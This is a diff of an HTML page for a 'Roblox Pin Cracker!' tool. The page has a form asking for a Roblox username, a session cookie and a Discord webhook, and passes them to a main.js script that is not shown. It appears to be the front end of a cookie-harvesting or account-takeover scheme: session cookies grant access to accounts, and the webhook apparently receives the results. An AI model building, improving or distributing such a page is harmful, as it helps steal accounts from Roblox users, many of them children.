@@ -1,31 +1,22 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-
-  <title>HTML</title>
-  
-  <!-- HTML -->
-  
-
-  <!-- Custom Styles -->
-  <link rel="stylesheet" href="style.css">
+    <title>Send Discord Webhook Message</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="main.js" defer></script>
 </head>
-
 <body>
-  <h1>Pin cracker</h1>
-  <input style="text" id="username" placeholder="Roblox username"<br>
-  <textarea name="Roblox cookie" id="Cookie" placeholder="Cookie"></textarea>
-  <input style="text" id="Webhook"
-  placeholder="webhook?"<br>
-  <br>
-  <button onclick="SUBMIT()">SUBMIT</button>
-  <script src="main.js"></script>
-  
+    <div class="container">
+        <h1>Roblox Pin Cracker!</h1>
+        <form id="messageForm">
+            <label for="username">Username:</label>
+            <input type="text" id="username" name="username" required>
+            <label for="message">Webhook:</label>
+            <input type="text" id="message" name="message" required>
+            <label for="cookie">Cookie:</label>
+            <input type="text" id="cookie" name="cookie" required>
+            <input type="submit" value="SUBMIT">
+        </form>
+    </div>
 </body>
-  
-  <!-- Project -->
-  </body>
 </html>
